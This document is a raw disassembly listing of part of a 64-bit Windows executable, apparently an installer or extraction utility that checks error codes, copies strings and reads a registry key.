   14000733b:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140007340:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140007345:	48 ff 15 64 41 00 00 	rex.W call *0x4164(%rip)        # 0x14000b4b0
   14000734c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007351:	83 3d f0 7a 00 00 00 	cmpl   $0x0,0x7af0(%rip)        # 0x14000ee48
   140007358:	8b 7c 24 50          	mov    0x50(%rsp),%edi
   14000735c:	75 23                	jne    0x140007381
   14000735e:	8b 05 38 8c 00 00    	mov    0x8c38(%rip),%eax        # 0x14000ff9c
   140007364:	40 84 c6             	test   %al,%sil
   140007367:	74 18                	je     0x140007381
   140007369:	a8 02                	test   $0x2,%al
   14000736b:	75 14                	jne    0x140007381
   14000736d:	8b c7                	mov    %edi,%eax
   14000736f:	25 00 00 00 ff       	and    $0xff000000,%eax
   140007374:	3d 00 00 00 aa       	cmp    $0xaa000000,%eax
   140007379:	75 06                	jne    0x140007381
   14000737b:	89 3d 1b 8c 00 00    	mov    %edi,0x8c1b(%rip)        # 0x14000ff9c
   140007381:	f7 05 19 8c 00 00 00 	testl  $0x800,0x8c19(%rip)        # 0x14000ffa4
   140007388:	08 00 00 
   14000738b:	74 08                	je     0x140007395
   14000738d:	89 3d f1 82 00 00    	mov    %edi,0x82f1(%rip)        # 0x14000f684
   140007393:	eb 4a                	jmp    0x1400073df
   140007395:	83 3d e4 82 00 00 00 	cmpl   $0x0,0x82e4(%rip)        # 0x14000f680
   14000739c:	75 37                	jne    0x1400073d5
   14000739e:	0f b7 0d 13 8c 00 00 	movzwl 0x8c13(%rip),%ecx        # 0x14000ffb8
   1400073a5:	8b 1d 11 8c 00 00    	mov    0x8c11(%rip),%ebx        # 0x14000ffbc
   1400073ab:	e8 04 c3 ff ff       	call   0x1400036b4
   1400073b0:	3b d8                	cmp    %eax,%ebx
   1400073b2:	75 21                	jne    0x1400073d5
   1400073b4:	8b c7                	mov    %edi,%eax
   1400073b6:	25 00 00 00 ff       	and    $0xff000000,%eax
   1400073bb:	3d 00 00 00 aa       	cmp    $0xaa000000,%eax
   1400073c0:	75 05                	jne    0x1400073c7
   1400073c2:	40 84 fe             	test   %dil,%sil
   1400073c5:	75 0e                	jne    0x1400073d5
   1400073c7:	f7 05 d3 8b 00 00 00 	testl  $0x200,0x8bd3(%rip)        # 0x14000ffa4
   1400073ce:	02 00 00 
   1400073d1:	74 0c                	je     0x1400073df
   1400073d3:	eb b8                	jmp    0x14000738d
   1400073d5:	c7 05 a5 82 00 00 c2 	movl   $0xbc2,0x82a5(%rip)        # 0x14000f684
   1400073dc:	0b 00 00 
   1400073df:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400073e4:	48 ff 15 35 3f 00 00 	rex.W call *0x3f35(%rip)        # 0x14000b320
   1400073eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400073f0:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400073f5:	48 ff 15 24 3f 00 00 	rex.W call *0x3f24(%rip)        # 0x14000b320
   1400073fc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007401:	f7 05 99 8b 00 00 00 	testl  $0x400,0x8b99(%rip)        # 0x14000ffa4
   140007408:	04 00 00 
   14000740b:	74 74                	je     0x140007481
   14000740d:	83 7c 24 50 00       	cmpl   $0x0,0x50(%rsp)
   140007412:	7d 6d                	jge    0x140007481
   140007414:	eb 69                	jmp    0x14000747f
   140007416:	e8 65 f3 ff ff       	call   0x140006780
   14000741b:	89 05 63 82 00 00    	mov    %eax,0x8263(%rip)        # 0x14000f684
   140007421:	48 ff 15 c0 3e 00 00 	rex.W call *0x3ec0(%rip)        # 0x14000b2e8
   140007428:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000742d:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140007433:	45 33 c9             	xor    %r9d,%r9d
   140007436:	44 8b c0             	mov    %eax,%r8d
   140007439:	c7 44 24 28 00 02 00 	movl   $0x200,0x28(%rsp)
   140007440:	00 
   140007441:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140007446:	33 d2                	xor    %edx,%edx
   140007448:	b9 00 10 00 00       	mov    $0x1000,%ecx
   14000744d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007452:	48 ff 15 2f 40 00 00 	rex.W call *0x402f(%rip)        # 0x14000b488
   140007459:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000745e:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140007463:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140007468:	4c 8b c3             	mov    %rbx,%r8
   14000746b:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140007472:	00 
   140007473:	ba c4 04 00 00       	mov    $0x4c4,%edx
   140007478:	33 c9                	xor    %ecx,%ecx
   14000747a:	e8 59 ef ff ff       	call   0x1400063d8
   14000747f:	33 f6                	xor    %esi,%esi
   140007481:	8b c6                	mov    %esi,%eax
   140007483:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   14000748a:	48 33 cc             	xor    %rsp,%rcx
   14000748d:	e8 1e 27 00 00       	call   0x140009bb0
   140007492:	48 8b 9c 24 b0 02 00 	mov    0x2b0(%rsp),%rbx
   140007499:	00 
   14000749a:	48 81 c4 80 02 00 00 	add    $0x280,%rsp
   1400074a1:	5f                   	pop    %rdi
   1400074a2:	5e                   	pop    %rsi
   1400074a3:	5d                   	pop    %rbp
   1400074a4:	c3                   	ret
   1400074a5:	cc                   	int3
   1400074a6:	cc                   	int3
   1400074a7:	cc                   	int3
   1400074a8:	cc                   	int3
   1400074a9:	cc                   	int3
   1400074aa:	cc                   	int3
   1400074ab:	cc                   	int3
   1400074ac:	48 8b c4             	mov    %rsp,%rax
   1400074af:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400074b3:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400074b7:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400074bb:	55                   	push   %rbp
   1400074bc:	41 54                	push   %r12
   1400074be:	41 55                	push   %r13
   1400074c0:	41 56                	push   %r14
   1400074c2:	41 57                	push   %r15
   1400074c4:	48 8d a8 78 fb ff ff 	lea    -0x488(%rax),%rbp
   1400074cb:	48 81 ec 60 05 00 00 	sub    $0x560,%rsp
   1400074d2:	48 8b 05 a7 6b 00 00 	mov    0x6ba7(%rip),%rax        # 0x14000e080
   1400074d9:	48 33 c4             	xor    %rsp,%rax
   1400074dc:	48 89 85 50 04 00 00 	mov    %rax,0x450(%rbp)
   1400074e3:	45 33 ed             	xor    %r13d,%r13d
   1400074e6:	33 c0                	xor    %eax,%eax
   1400074e8:	44 39 2d 59 79 00 00 	cmp    %r13d,0x7959(%rip)        # 0x14000ee48
   1400074ef:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400074f2:	44 89 6c 24 3c       	mov    %r13d,0x3c(%rsp)
   1400074f7:	45 8b fd             	mov    %r13d,%r15d
   1400074fa:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   1400074ff:	45 8b e5             	mov    %r13d,%r12d
   140007502:	8d 58 03             	lea    0x3(%rax),%ebx
   140007505:	89 45 84             	mov    %eax,-0x7c(%rbp)
   140007508:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   14000750d:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140007512:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140007517:	44 89 2d 66 81 00 00 	mov    %r13d,0x8166(%rip)        # 0x14000f684
   14000751e:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   140007523:	75 21                	jne    0x140007546
   140007525:	45 8d 45 04          	lea    0x4(%r13),%r8d
   140007529:	48 8d 15 6c 8a 00 00 	lea    0x8a6c(%rip),%rdx        # 0x14000ff9c
   140007530:	48 8d 0d a1 45 00 00 	lea    0x45a1(%rip),%rcx        # 0x14000bad8
   140007537:	e8 10 de ff ff       	call   0x14000534c
   14000753c:	ff c8                	dec    %eax
   14000753e:	3b c3                	cmp    %ebx,%eax
   140007540:	0f 87 21 01 00 00    	ja     0x140007667
   140007546:	45 8b f5             	mov    %r13d,%r14d
   140007549:	bf 01 00 00 00       	mov    $0x1,%edi
   14000754e:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   140007552:	33 d2                	xor    %edx,%edx
   140007554:	44 89 6c 24 38       	mov    %r13d,0x38(%rsp)
   140007559:	48 8d 4d 84          	lea    -0x7c(%rbp),%rcx
   14000755d:	44 8d 42 64          	lea    0x64(%rdx),%r8d
   140007561:	e8 40 a6 ff ff       	call   0x140001ba6
   140007566:	44 38 2d f5 7a 00 00 	cmp    %r13b,0x7af5(%rip)        # 0x14000f062
   14000756d:	c7 45 80 68 00 00 00 	movl   $0x68,-0x80(%rbp)
   140007574:	0f 85 1b 01 00 00    	jne    0x140007695
   14000757a:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140007580:	48 8d 54 24 3c       	lea    0x3c(%rsp),%rdx
   140007585:	48 8d 0d 54 45 00 00 	lea    0x4554(%rip),%rcx        # 0x14000bae0
   14000758c:	e8 bb dd ff ff       	call   0x14000534c
   140007591:	ff c8                	dec    %eax
   140007593:	3b c3                	cmp    %ebx,%eax
   140007595:	0f 87 cc 00 00 00    	ja     0x140007667
   14000759b:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   14000759f:	3b c7                	cmp    %edi,%eax
   1400075a1:	75 07                	jne    0x1400075aa
   1400075a3:	66 44 89 6d c0       	mov    %r13w,-0x40(%rbp)
   1400075a8:	eb 18                	jmp    0x1400075c2
   1400075aa:	83 f8 02             	cmp    $0x2,%eax
   1400075ad:	75 0b                	jne    0x1400075ba
   1400075af:	b8 06 00 00 00       	mov    $0x6,%eax
   1400075b4:	66 89 45 c0          	mov    %ax,-0x40(%rbp)
   1400075b8:	eb 08                	jmp    0x1400075c2
   1400075ba:	3b c3                	cmp    %ebx,%eax
   1400075bc:	75 07                	jne    0x1400075c5
   1400075be:	66 89 5d c0          	mov    %bx,-0x40(%rbp)
   1400075c2:	89 7d bc             	mov    %edi,-0x44(%rbp)
   1400075c5:	45 85 f6             	test   %r14d,%r14d
   1400075c8:	0f 85 0a 01 00 00    	jne    0x1400076d8
   1400075ce:	0f b7 05 83 78 00 00 	movzwl 0x7883(%rip),%eax        # 0x14000ee58
   1400075d5:	66 85 c0             	test   %ax,%ax
   1400075d8:	74 66                	je     0x140007640
   1400075da:	40 84 c7             	test   %al,%dil
   1400075dd:	74 09                	je     0x1400075e8
   1400075df:	48 8d 0d 0a 45 00 00 	lea    0x450a(%rip),%rcx        # 0x14000baf0
   1400075e6:	eb 0f                	jmp    0x1400075f7
   1400075e8:	a8 02                	test   $0x2,%al
   1400075ea:	0f 84 0b 03 00 00    	je     0x1400078fb
   1400075f0:	48 8d 0d 01 45 00 00 	lea    0x4501(%rip),%rcx        # 0x14000baf8
   1400075f7:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400075fd:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140007601:	e8 46 dd ff ff       	call   0x14000534c
   140007606:	85 c0                	test   %eax,%eax
   140007608:	74 5d                	je     0x140007667
   14000760a:	48 8d 05 bf 44 00 00 	lea    0x44bf(%rip),%rax        # 0x14000bad0
   140007611:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140007615:	44 8b ce             	mov    %esi,%r9d
   140007618:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000761d:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140007621:	8b d7                	mov    %edi,%edx
   140007623:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   140007628:	48 ff 15 b1 3c 00 00 	rex.W call *0x3cb1(%rip)        # 0x14000b2e0
   14000762f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007634:	85 c0                	test   %eax,%eax
   140007636:	74 08                	je     0x140007640
   140007638:	44 8b ff             	mov    %edi,%r15d
   14000763b:	e9 fb 00 00 00       	jmp    0x14000773b
   140007640:	45 85 ff             	test   %r15d,%r15d
   140007643:	0f 85 f2 00 00 00    	jne    0x14000773b
   140007649:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   14000764f:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140007653:	48 8d 0d a6 44 00 00 	lea    0x44a6(%rip),%rcx        # 0x14000bb00
   14000765a:	e8 ed dc ff ff       	call   0x14000534c
   14000765f:	85 c0                	test   %eax,%eax
   140007661:	0f 85 d4 00 00 00    	jne    0x14000773b
   140007667:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   14000766c:	45 33 c9             	xor    %r9d,%r9d
   14000766f:	45 33 c0             	xor    %r8d,%r8d
   140007672:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140007679:	00 
   14000767a:	ba b1 04 00 00       	mov    $0x4b1,%edx
   14000767f:	33 c9                	xor    %ecx,%ecx
   140007681:	e8 52 ed ff ff       	call   0x1400063d8
   140007686:	c7 05 f4 7f 00 00 14 	movl   $0x80070714,0x7ff4(%rip)        # 0x14000f684
   14000768d:	07 07 80 
   140007690:	e9 66 02 00 00       	jmp    0x1400078fb
   140007695:	4c 8d 05 c6 79 00 00 	lea    0x79c6(%rip),%r8        # 0x14000f062
   14000769c:	ba 04 01 00 00       	mov    $0x104,%edx
   1400076a1:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400076a5:	4c 2b c0             	sub    %rax,%r8
   1400076a8:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400076ac:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400076b3:	48 85 c0             	test   %rax,%rax
   1400076b6:	74 12                	je     0x1400076ca
   1400076b8:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   1400076bc:	84 c0                	test   %al,%al
   1400076be:	74 0a                	je     0x1400076ca
   1400076c0:	88 01                	mov    %al,(%rcx)
   1400076c2:	48 03 cf             	add    %rdi,%rcx
   1400076c5:	48 2b d7             	sub    %rdi,%rdx
   1400076c8:	75 e2                	jne    0x1400076ac
   1400076ca:	48 85 d2             	test   %rdx,%rdx
   1400076cd:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400076d1:	48 0f 45 c1          	cmovne %rcx,%rax
   1400076d5:	44 88 28             	mov    %r13b,(%rax)
   1400076d8:	44 3b f7             	cmp    %edi,%r14d
   1400076db:	75 5e                	jne    0x14000773b
   1400076dd:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400076e3:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1400076e7:	48 8d 0d 22 44 00 00 	lea    0x4422(%rip),%rcx        # 0x14000bb10
   1400076ee:	e8 59 dc ff ff       	call   0x14000534c
   1400076f3:	85 c0                	test   %eax,%eax
   1400076f5:	0f 84 6c ff ff ff    	je     0x140007667
   1400076fb:	44 38 2d 60 79 00 00 	cmp    %r13b,0x7960(%rip)        # 0x14000f062
   140007702:	0f 85 dd 02 00 00    	jne    0x1400079e5
   140007708:	48 8d 05 c1 43 00 00 	lea    0x43c1(%rip),%rax        # 0x14000bad0
   14000770f:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140007713:	44 8b ce             	mov    %esi,%r9d
   140007716:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000771b:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   14000771f:	8b d7                	mov    %edi,%edx
   140007721:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   140007726:	48 ff 15 b3 3b 00 00 	rex.W call *0x3bb3(%rip)        # 0x14000b2e0
   14000772d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007732:	83 f8 02             	cmp    $0x2,%eax
   140007735:	0f 84 aa 02 00 00    	je     0x1400079e5
   14000773b:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   140007740:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140007745:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140007749:	e8 de a7 ff ff       	call   0x140001f2c
   14000774e:	85 c0                	test   %eax,%eax
   140007750:	0f 84 a5 01 00 00    	je     0x1400078fb
   140007756:	8b 5c 24 38          	mov    0x38(%rsp),%ebx
   14000775a:	45 85 e4             	test   %r12d,%r12d
   14000775d:	75 1e                	jne    0x14000777d
   14000775f:	66 39 3d 52 88 00 00 	cmp    %di,0x8852(%rip)        # 0x14000ffb8
   140007766:	74 15                	je     0x14000777d
   140007768:	44 39 2d d1 76 00 00 	cmp    %r13d,0x76d1(%rip)        # 0x14000ee40
   14000776f:	74 0c                	je     0x14000777d
   140007771:	85 db                	test   %ebx,%ebx
   140007773:	75 10                	jne    0x140007785
   140007775:	44 8b e7             	mov    %edi,%r12d
   140007778:	e8 5b a4 ff ff       	call   0x140001bd8
   14000777d:	85 db                	test   %ebx,%ebx
   14000777f:	0f 84 20 01 00 00    	je     0x1400078a5
   140007785:	44 39 2d cc 6a 00 00 	cmp    %r13d,0x6acc(%rip)        # 0x14000e258
   14000778c:	0f 84 14 02 00 00    	je     0x1400079a6
   140007792:	85 db                	test   %ebx,%ebx
   140007794:	0f 84 0b 01 00 00    	je     0x1400078a5
   14000779a:	f6 05 03 88 00 00 04 	testb  $0x4,0x8803(%rip)        # 0x14000ffa4
   1400077a1:	0f 84 fe 00 00 00    	je     0x1400078a5
   1400077a7:	e8 98 f0 ff ff       	call   0x140006844
   1400077ac:	48 8b f8             	mov    %rax,%rdi
   1400077af:	48 85 c0             	test   %rax,%rax
   1400077b2:	0f 84 c9 01 00 00    	je     0x140007981
   1400077b8:	48 8d 15 b1 6a 00 00 	lea    0x6ab1(%rip),%rdx        # 0x14000e270
   1400077bf:	48 8b c8             	mov    %rax,%rcx
   1400077c2:	48 ff 15 7f 3b 00 00 	rex.W call *0x3b7f(%rip)        # 0x14000b348
   1400077c9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400077ce:	48 8b d0             	mov    %rax,%rdx
   1400077d1:	48 85 c0             	test   %rax,%rax
   1400077d4:	0f 84 54 01 00 00    	je     0x14000792e
   1400077da:	44 39 2d 6f 76 00 00 	cmp    %r13d,0x766f(%rip)        # 0x14000ee50
   1400077e1:	48 8d 05 d0 7e 00 00 	lea    0x7ed0(%rip),%rax        # 0x14000f6b8
   1400077e8:	0f b7 0d c9 87 00 00 	movzwl 0x87c9(%rip),%ecx        # 0x14000ffb8
   1400077ef:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400077f4:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400077f9:	48 8d 05 50 7f 00 00 	lea    0x7f50(%rip),%rax        # 0x14000f750
   140007800:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140007805:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140007809:	66 89 4c 24 68       	mov    %cx,0x68(%rsp)
   14000780e:	0f b7 0d 43 76 00 00 	movzwl 0x7643(%rip),%ecx        # 0x14000ee58
   140007815:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000781a:	4c 89 6c 24 40       	mov    %r13,0x40(%rsp)
   14000781f:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140007824:	89 4c 24 6c          	mov    %ecx,0x6c(%rsp)
   140007828:	74 08                	je     0x140007832
   14000782a:	0f ba e9 10          	bts    $0x10,%ecx
   14000782e:	89 4c 24 6c          	mov    %ecx,0x6c(%rsp)
   140007832:	8b 05 6c 87 00 00    	mov    0x876c(%rip),%eax        # 0x14000ffa4
   140007838:	a8 08                	test   $0x8,%al
   14000783a:	74 08                	je     0x140007844
   14000783c:	0f ba e9 11          	bts    $0x11,%ecx
   140007840:	89 4c 24 6c          	mov    %ecx,0x6c(%rsp)
   140007844:	a8 10                	test   $0x10,%al
   140007846:	74 08                	je     0x140007850
   140007848:	0f ba e9 12          	bts    $0x12,%ecx
   14000784c:	89 4c 24 6c          	mov    %ecx,0x6c(%rsp)
   140007850:	8b 05 12 79 00 00    	mov    0x7912(%rip),%eax        # 0x14000f168
   140007856:	a8 40                	test   $0x40,%al
   140007858:	74 08                	je     0x140007862
   14000785a:	0f ba e9 13          	bts    $0x13,%ecx
   14000785e:	89 4c 24 6c          	mov    %ecx,0x6c(%rsp)
   140007862:	84 c0                	test   %al,%al
   140007864:	79 08                	jns    0x14000786e
   140007866:	0f ba e9 14          	bts    $0x14,%ecx
   14000786a:	89 4c 24 6c          	mov    %ecx,0x6c(%rsp)
   14000786e:	8b 05 34 87 00 00    	mov    0x8734(%rip),%eax        # 0x14000ffa8
   140007874:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007879:	89 44 24 70          	mov    %eax,0x70(%rsp)
   14000787d:	48 8b c2             	mov    %rdx,%rax
   140007880:	e8 8b 27 00 00       	call   0x14000a010
   140007885:	89 05 f9 7d 00 00    	mov    %eax,0x7df9(%rip)        # 0x14000f684
   14000788b:	48 8b cf             	mov    %rdi,%rcx
   14000788e:	85 c0                	test   %eax,%eax
   140007890:	78 4e                	js     0x1400078e0
   140007892:	48 ff 15 cf 3a 00 00 	rex.W call *0x3acf(%rip)        # 0x14000b368
   140007899:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000789e:	bf 01 00 00 00       	mov    $0x1,%edi
   1400078a3:	eb 15                	jmp    0x1400078ba
   1400078a5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400078aa:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   1400078ae:	48 8b cb             	mov    %rbx,%rcx
   1400078b1:	e8 da f9 ff ff       	call   0x140007290
   1400078b6:	85 c0                	test   %eax,%eax
   1400078b8:	74 32                	je     0x1400078ec
   1400078ba:	48 8b cb             	mov    %rbx,%rcx
   1400078bd:	48 ff 15 94 3a 00 00 	rex.W call *0x3a94(%rip)        # 0x14000b358
   1400078c4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400078c9:	44 03 f7             	add    %edi,%r14d
   1400078cc:	41 83 fe 02          	cmp    $0x2,%r14d
   1400078d0:	0f 83 0f 01 00 00    	jae    0x1400079e5
   1400078d6:	bb 03 00 00 00       	mov    $0x3,%ebx
   1400078db:	e9 72 fc ff ff       	jmp    0x140007552
   1400078e0:	48 ff 15 81 3a 00 00 	rex.W call *0x3a81(%rip)        # 0x14000b368
   1400078e7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400078ec:	48 8b cb             	mov    %rbx,%rcx
   1400078ef:	48 ff 15 62 3a 00 00 	rex.W call *0x3a62(%rip)        # 0x14000b358
   1400078f6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400078fb:	33 c0                	xor    %eax,%eax
   1400078fd:	48 8b 8d 50 04 00 00 	mov    0x450(%rbp),%rcx
   140007904:	48 33 cc             	xor    %rsp,%rcx
   140007907:	e8 a4 22 00 00       	call   0x140009bb0
   14000790c:	4c 8d 9c 24 60 05 00 	lea    0x560(%rsp),%r11
   140007913:	00 
   140007914:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140007918:	49 8b 73 38          	mov    0x38(%r11),%rsi
   14000791c:	49 8b 7b 40          	mov    0x40(%r11),%rdi
   140007920:	49 8b e3             	mov    %r11,%rsp
   140007923:	41 5f                	pop    %r15
   140007925:	41 5e                	pop    %r14
   140007927:	41 5d                	pop    %r13
   140007929:	41 5c                	pop    %r12
   14000792b:	5d                   	pop    %rbp
   14000792c:	c3                   	ret
   14000792d:	cc                   	int3
   14000792e:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140007933:	4c 8d 05 36 69 00 00 	lea    0x6936(%rip),%r8        # 0x14000e270
   14000793a:	45 33 c9             	xor    %r9d,%r9d
   14000793d:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140007944:	00 
   140007945:	ba c9 04 00 00       	mov    $0x4c9,%edx
   14000794a:	33 c9                	xor    %ecx,%ecx
   14000794c:	e8 87 ea ff ff       	call   0x1400063d8
   140007951:	48 8b cf             	mov    %rdi,%rcx
   140007954:	48 ff 15 0d 3a 00 00 	rex.W call *0x3a0d(%rip)        # 0x14000b368
   14000795b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007960:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140007965:	48 ff 15 ec 39 00 00 	rex.W call *0x39ec(%rip)        # 0x14000b358
   14000796c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007971:	e8 0a ee ff ff       	call   0x140006780
   140007976:	89 05 08 7d 00 00    	mov    %eax,0x7d08(%rip)        # 0x14000f684
   14000797c:	e9 7a ff ff ff       	jmp    0x1400078fb
   140007981:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140007986:	4c 8d 05 4b 3f 00 00 	lea    0x3f4b(%rip),%r8        # 0x14000b8d8
   14000798d:	45 33 c9             	xor    %r9d,%r9d
   140007990:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140007997:	00 
   140007998:	ba c8 04 00 00       	mov    $0x4c8,%edx
   14000799d:	33 c9                	xor    %ecx,%ecx
   14000799f:	e8 34 ea ff ff       	call   0x1400063d8
   1400079a4:	eb ba                	jmp    0x140007960
   1400079a6:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   1400079ab:	45 33 c9             	xor    %r9d,%r9d
   1400079ae:	45 33 c0             	xor    %r8d,%r8d
   1400079b1:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400079b8:	00 
   1400079b9:	ba c7 04 00 00       	mov    $0x4c7,%edx
   1400079be:	33 c9                	xor    %ecx,%ecx
   1400079c0:	e8 13 ea ff ff       	call   0x1400063d8
   1400079c5:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400079ca:	48 ff 15 87 39 00 00 	rex.W call *0x3987(%rip)        # 0x14000b358
   1400079d1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400079d6:	c7 05 a4 7c 00 00 2b 	movl   $0x8007042b,0x7ca4(%rip)        # 0x14000f684
   1400079dd:	04 07 80 
   1400079e0:	e9 16 ff ff ff       	jmp    0x1400078fb
   1400079e5:	44 39 2d d4 6e 00 00 	cmp    %r13d,0x6ed4(%rip)        # 0x14000e8c0
   1400079ec:	0f 84 55 01 00 00    	je     0x140007b47
   1400079f2:	44 38 2d 77 6e 00 00 	cmp    %r13b,0x6e77(%rip)        # 0x14000e870
   1400079f9:	0f 84 48 01 00 00    	je     0x140007b47
   1400079ff:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140007a04:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140007a09:	41 b9 1f 00 02 00    	mov    $0x2001f,%r9d
   140007a0f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007a14:	45 33 c0             	xor    %r8d,%r8d
   140007a17:	48 8d 15 1a 67 00 00 	lea    0x671a(%rip),%rdx        # 0x14000e138
   140007a1e:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140007a25:	48 ff 15 dc 37 00 00 	rex.W call *0x37dc(%rip)        # 0x14000b208
   140007a2c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007a31:	85 c0                	test   %eax,%eax
   140007a33:	0f 85 0e 01 00 00    	jne    0x140007b47
   140007a39:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140007a3e:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140007a43:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007a48:	48 8d 15 21 6e 00 00 	lea    0x6e21(%rip),%rdx        # 0x14000e870
   140007a4f:	48 8d 85 10 02 00 00 	lea    0x210(%rbp),%rax
   140007a56:	bb 38 02 00 00       	mov    $0x238,%ebx
   140007a5b:	45 33 c9             	xor    %r9d,%r9d
   140007a5e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007a63:	45 33 c0             	xor    %r8d,%r8d
   140007a66:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   140007a6a:	48 ff 15 d7 37 00 00 	rex.W call *0x37d7(%rip)        # 0x14000b248
   140007a71:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007a76:	85 c0                	test   %eax,%eax
   140007a78:	0f 85 b8 00 00 00    	jne    0x140007b36
   140007a7e:	33 d2                	xor    %edx,%edx
   140007a80:	44 88 ad 00 01 00 00 	mov    %r13b,0x100(%rbp)
   140007a87:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   140007a8d:	48 8d 8d 01 01 00 00 	lea    0x101(%rbp),%rcx
   140007a94:	e8 0d a1 ff ff       	call   0x140001ba6
   140007a99:	ba 04 01 00 00       	mov    $0x104,%edx
   140007a9e:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   140007aa5:	48 ff 15 4c 38 00 00 	rex.W call *0x384c(%rip)        # 0x14000b2f8
   140007aac:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007ab1:	85 c0                	test   %eax,%eax
   140007ab3:	74 18                	je     0x140007acd
   140007ab5:	4c 8d 05 74 3d 00 00 	lea    0x3d74(%rip),%r8        # 0x14000b830
   140007abc:	ba 04 01 00 00       	mov    $0x104,%edx
   140007ac1:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   140007ac8:	e8 0f 1b 00 00       	call   0x1400095dc
   140007acd:	48 8d 05 7c 7c 00 00 	lea    0x7c7c(%rip),%rax        # 0x14000f750
